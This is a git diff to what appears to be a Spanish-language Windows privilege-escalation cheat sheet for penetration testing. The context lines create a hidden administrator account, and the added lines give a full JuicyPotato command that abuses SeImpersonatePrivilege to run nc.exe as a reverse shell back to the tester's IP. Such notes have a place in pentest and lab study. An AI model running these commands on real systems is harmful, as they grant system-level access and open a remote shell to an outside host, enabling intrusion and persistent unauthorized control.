@@ -69,6 +69,11 @@ Teniendo privilegios de root, creamos un usuario y lo incluimos en el grupo de a
 net user maopiccoto maopiccoto123! /add
 net localgroup Administrators maopiccoto /add
 ```
+Si tenemos el **SeImpersonatePrivilege** podemos lanzar el JuicyPotato
+```bash
+./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd <myIP>" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
+```
+
 ### NetTweaks && Firewall
 Abriendo puertos y autorizando in/out dataTraffic en el Firewall
 ```posh
